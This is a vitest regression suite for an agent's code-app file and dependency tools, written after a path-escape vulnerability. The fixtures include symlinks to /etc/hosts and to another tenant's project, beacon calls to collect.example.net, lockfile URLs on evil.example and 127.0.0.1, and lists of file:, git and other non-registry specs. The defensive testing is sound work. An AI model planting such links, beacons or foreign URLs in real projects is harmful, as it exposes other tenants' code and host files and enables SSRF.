import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { codeContext, DEPLOYMENT, WORKSPACE } from './codeContext.js';
import {
  codeAppAddDependencyTool,
  codeAppBuildTool,
  codeAppInstallTool,
  codeAppReadFilesTool,
  codeAppWriteFilesTool,
  resetCodeSessionForTests,
} from '../src/tools/codeApp.js';
import { dependencyProblems, escapingLinks, foreignResolved, nonRegistrySpec } from '../src/codeProjectSafety.js';

/*
  A stored package.json with a file: dependency made the install link frontend/node_modules/<name> to any folder on the
  host, and code_app_read_files, whose path check was lexical, read through it: another workspace's project, /etc/hosts,
  the agent's environment. Every file read and write now resolves real paths, follows no link, and installs only
  registry packages.
*/
const FAKE_CLI = fileURLToPath(new URL('./fixtures/fake-tooljet-cli.mjs', import.meta.url));

let root: string;
let log: string;
const project = () => join(root, DEPLOYMENT, WORKSPACE, 'demo');
const sibling = () => join(root, DEPLOYMENT, 'ws-2', 'victim');
const text = (r: { content: { text: string }[] }) => r.content[0].text;
const calls = () =>
  readFileSync(log, 'utf8').trim().split('\n').filter(Boolean).map((l) => JSON.parse(l).args.join(' ')).filter((c) => !c.startsWith('app source-pull'));
const replies = (r: Record<string, { code: number; output: unknown }>) => {
  process.env.FAKE_CLI_REPLIES = JSON.stringify(r);
};
const read = (paths: string[]) => codeAppReadFilesTool(codeContext()).handler({ name: 'demo', paths } as any);
const write = (args: Record<string, unknown>) => codeAppWriteFilesTool(codeContext()).handler({ name: 'demo', ...args } as any);
const pkg = (deps: Record<string, string>) =>
  writeFileSync(join(project(), 'frontend', 'package.json'), JSON.stringify({ name: 'demo', dependencies: deps }, null, 2) + '\n');
const lock = (packages: Record<string, unknown>) =>
  writeFileSync(join(project(), 'frontend', 'package-lock.json'), JSON.stringify({ lockfileVersion: 3, packages: { '': {}, ...packages } }));

beforeEach(() => {
  root = mkdtempSync(join(tmpdir(), 'code-app-paths-'));
  log = join(root, 'calls.log');
  writeFileSync(log, '');
  mkdirSync(join(project(), 'frontend', 'src', 'App'), { recursive: true });
  writeFileSync(join(project(), 'app.json'), '{"appId":"app-1"}\n');
  writeFileSync(join(project(), 'frontend', 'src', 'App', 'index.tsx'), 'export const App = 1;\n');
  pkg({ react: '19.1.0' });
  // Another tenant's project on the same host.
  mkdirSync(join(sibling(), 'frontend', 'src'), { recursive: true });
  writeFileSync(join(sibling(), 'frontend', 'src', 'App.tsx'), 'const SECRET_OF_WS2 = "other-tenant-code";\n');
  Object.assign(process.env, { TOOLJET_CODE_APP_ROOT: root, TOOLJET_CLI: FAKE_CLI, FAKE_CLI_LOG: log, MCP_CODE_APP_SCAN_PREFETCH: '0' });
  resetCodeSessionForTests();
});
afterEach(() => {
  rmSync(root, { recursive: true, force: true });
  for (const k of ['TOOLJET_CODE_APP_ROOT', 'TOOLJET_CLI', 'FAKE_CLI_LOG', 'FAKE_CLI_REPLIES', 'FAKE_INSTALL_LINK', 'MCP_CODE_APP_SCAN_PREFETCH', 'npm_config_registry'])
    delete process.env[k];
  resetCodeSessionForTests();
});

describe('code_app_read_files follows no link out of the project', () => {
  beforeEach(() => {
    // What `npm install` makes of { "other": "file:../../../ws-2/victim/frontend", "hosts": "file:/etc/hosts" }.
    mkdirSync(join(project(), 'frontend', 'node_modules'), { recursive: true });
    symlinkSync(join(sibling(), 'frontend'), join(project(), 'frontend', 'node_modules', 'other'));
    symlinkSync('/etc/hosts', join(project(), 'frontend', 'node_modules', 'hosts'));
  });

  it('refuses a read through a node_modules link to a sibling project', async () => {
    const result = await read(['frontend/node_modules/other/src/App.tsx']);
    expect(result.isError).toBe(true);
    expect(text(result)).toMatch(/goes through a link/);
    expect(text(result)).not.toContain('other-tenant-code');
  });

  it('refuses a read of a link to /etc/hosts', async () => {
    const result = await read(['frontend/node_modules/hosts']);
    expect(result.isError).toBe(true);
    expect(text(result)).toMatch(/goes through a link/);
    expect(text(result)).not.toMatch(/localhost/);
  });

  it('refuses a link inside the source too, and a path that leaves the project', async () => {
    symlinkSync('/etc/hosts', join(project(), 'frontend', 'src', 'leak.ts'));
    expect(text(await read(['frontend/src/leak.ts']))).toMatch(/goes through a link/);
    expect(text(await read(['../../ws-2/victim/frontend/src/App.tsx']))).toMatch(/outside the project/);
  });

  it('still reads the project\'s own files, and lists no linked file', async () => {
    symlinkSync('/etc/hosts', join(project(), 'frontend', 'src', 'leak.ts'));
    const result = JSON.parse(text(await read(['frontend/src/App/index.tsx'])));
    expect(result.files['frontend/src/App/index.tsx']).toBe('export const App = 1;\n');
    const listing = JSON.parse(text(await codeAppReadFilesTool(codeContext()).handler({ name: 'demo' } as any)));
    expect(listing.files).toContain('frontend/src/App/index.tsx');
    expect(listing.files).not.toContain('frontend/src/leak.ts');
  });
});

describe('code_app_write_files writes only real project files', () => {
  it('refuses a write through a linked folder into a sibling project, and changes nothing there', async () => {
    symlinkSync(join(sibling(), 'frontend', 'src'), join(project(), 'frontend', 'src', 'shared'));
    const result = await write({ files: [{ path: 'frontend/src/shared/App.tsx', content: 'export const pwned = 1;\n' }] });
    expect(result.isError).toBe(true);
    expect(text(result)).toMatch(/goes through a link/);
    expect(readFileSync(join(sibling(), 'frontend', 'src', 'App.tsx'), 'utf8')).toContain('other-tenant-code');
  });

  it('refuses a package under frontend/src/node_modules and dot files, which are bundled but never stored or scanned', async () => {
    for (const path of ['frontend/src/node_modules/date-utils/index.js', 'frontend/src/App/node_modules/x/index.ts', 'frontend/src/.hidden/beacon.ts', 'frontend/src/App/.env.ts']) {
      const result = await write({ files: [{ path, content: 'fetch("https://collect.example.net")\n' }] });
      expect(result.isError, path).toBe(true);
      expect(text(result)).toMatch(/not editable/);
    }
    expect(existsSync(join(project(), 'frontend', 'src', 'node_modules'))).toBe(false);
  });
});

describe('builds and installs see exactly what is stored', () => {
  it('a build removes a shadow package under frontend/src/node_modules before it bundles', async () => {
    mkdirSync(join(project(), 'frontend', 'src', 'node_modules', 'date-utils'), { recursive: true });
    writeFileSync(join(project(), 'frontend', 'src', 'node_modules', 'date-utils', 'index.js'), 'fetch("https://collect.example.net")\n');
    replies({ 'library build': { code: 0, output: 'TypeScript compiled (0 errors)' }, 'app check': { code: 0, output: { problems: [], security: { gate: 'pass', findings: [] } } } });
    const result = JSON.parse(text(await codeAppBuildTool(codeContext()).handler({ name: 'demo' } as any)));
    expect(result.removed_unstored.files).toEqual(['frontend/src/node_modules']);
    expect(existsSync(join(project(), 'frontend', 'src', 'node_modules'))).toBe(false);
  });

  it('an install with a file: dependency in the stored package.json is refused before anything is uploaded', async () => {
    pkg({ react: '19.1.0', other: 'file:../../../ws-2/victim/frontend' });
    const result = await codeAppInstallTool(codeContext()).handler({ name: 'demo' } as any);
    expect(result.isError).toBe(true);
    expect(text(result)).toMatch(/dependencies must all be registry packages/);
    expect(text(result)).toMatch(/"other"/);
    expect(calls()).toEqual([]);
  });
});

describe('code_app_add_dependency installs registry packages only', () => {
  it('refuses a spec npm would read as a folder, before the vet', async () => {
    const result = await codeAppAddDependencyTool(codeContext()).handler({ name: 'demo', packages: ['x@..'] } as any);
    expect(result.isError).toBe(true);
    expect(text(result)).toMatch(/Not added: x@\.\.: it is a local path/);
    expect(calls()).toEqual([]);
  });

  it('refuses to install over a stored file:, link:, git or GitHub dependency, and restores package.json', async () => {
    for (const spec of ['file:/', 'link:../x', 'git+https://github.com/a/b.git', 'a/b', 'github:a/b', 'https://x.test/a.tgz', 'npm:lodash@4']) {
      pkg({ react: '19.1.0', bad: spec });
      const before = readFileSync(join(project(), 'frontend', 'package.json'), 'utf8');
      replies({ 'app vet': { code: 0, output: { ok: true, packages: [{ name: 'date-fns', version: '4.1.0' }] } } });
      const result = await codeAppAddDependencyTool(codeContext()).handler({ name: 'demo', packages: ['date-fns@4'] } as any);
      expect(result.isError, spec).toBe(true);
      expect(text(result)).toMatch(/registry packages/);
      expect(readFileSync(join(project(), 'frontend', 'package.json'), 'utf8')).toBe(before);
    }
    expect(calls().filter((c) => c === 'app install')).toEqual([]);
  });

  it('removing the bad dependency installs, writing the lockfile again from the registry', async () => {
    pkg({ react: '19.1.0', other: 'file:../../../ws-2/victim/frontend' });
    lock({ 'node_modules/other': { resolved: 'file:../../../ws-2/victim/frontend', link: true } });
    const result = JSON.parse(text(await codeAppAddDependencyTool(codeContext()).handler({ name: 'demo', packages: [], remove: ['other'] } as any)));
    expect(result.removed).toEqual(['other']);
    expect(result.lockfile).toMatch(/written again from the registry/);
    expect(calls()).toEqual(['app install']);
  });

  it('removes a link out of the project that an install made, and says so', async () => {
    replies({ 'app vet': { code: 0, output: { ok: true, packages: [{ name: 'date-fns', version: '4.1.0' }] } } });
    process.env.FAKE_INSTALL_LINK = JSON.stringify({ name: 'escape', target: sibling() });
    const result = await codeAppAddDependencyTool(codeContext()).handler({ name: 'demo', packages: ['date-fns@4'] } as any);
    expect(result.isError).toBe(true);
    expect(text(result)).toMatch(/linked frontend\/node_modules\/escape to a folder outside the project/);
    expect(existsSync(join(project(), 'frontend', 'node_modules', 'escape'))).toBe(false);
  });
});

describe('lockfile download URLs', () => {
  it('accepts the configured registry and refuses any other host, plain http or credentials', () => {
    expect(foreignResolved('https://registry.npmjs.org/date-fns/-/date-fns-4.1.0.tgz')).toBeUndefined();
    expect(foreignResolved('http://127.0.0.1:18765/date-utils-lite-1.0.0.tgz')).toMatch(/not the configured registry/);
    expect(foreignResolved('https://evil.example/date-fns-4.1.0.tgz')).toMatch(/not the configured registry/);
    expect(foreignResolved('http://registry.npmjs.org/x/-/x-1.0.0.tgz')).toMatch(/plain http|not the configured registry/);
    expect(foreignResolved('https://u:p@registry.npmjs.org/x/-/x-1.0.0.tgz')).toMatch(/credentials/);
    process.env.npm_config_registry = 'http://localhost:4873';
    expect(foreignResolved('http://localhost:4873/x/-/x-1.0.0.tgz')).toBeUndefined();
  });

  it('refuses an install whose stored lockfile fetches from another host (the blind SSRF), before the CLI runs', async () => {
    pkg({ react: '19.1.0', 'date-utils-lite': '1.0.0' });
    lock({ 'node_modules/date-utils-lite': { version: '1.0.0', resolved: 'http://127.0.0.1:18765/date-utils-lite-1.0.0.tgz' } });
    expect(dependencyProblems(project())).toEqual([expect.stringMatching(/date-utils-lite.*not the configured registry/)]);
    const result = await codeAppInstallTool(codeContext()).handler({ name: 'demo' } as any);
    expect(text(result)).toMatch(/127\.0\.0\.1/);
    expect(calls()).toEqual([]);
  });

  it('refuses linked workspace folders in the lockfile', () => {
    lock({ '../other': { version: '1.0.0' }, 'node_modules/x': { link: true, resolved: '../other' } });
    expect(dependencyProblems(project())).toHaveLength(2);
  });

  it('spec rules', () => {
    for (const ok of ['1.2.3', '^4.17.21', '~1.2', '>=1 <2', 'latest', '*', '']) expect(nonRegistrySpec(ok), ok).toBeUndefined();
    for (const bad of ['file:x', '..', './x', '~/x', '/abs', 'a/b', 'x.tgz', 'git://x', 'npm:x@1', 'workspace:*', '1.0.0#sha']) expect(nonRegistrySpec(bad), bad).toBeDefined();
  });

  it('escapingLinks ignores links that stay inside the project', () => {
    mkdirSync(join(project(), 'frontend', 'node_modules', '.store', 'a'), { recursive: true });
    symlinkSync(join(project(), 'frontend', 'node_modules', '.store', 'a'), join(project(), 'frontend', 'node_modules', 'a'));
    symlinkSync('/etc', join(project(), 'frontend', 'node_modules', 'etc'));
    expect(escapingLinks(project())).toEqual(['frontend/node_modules/etc']);
  });
});
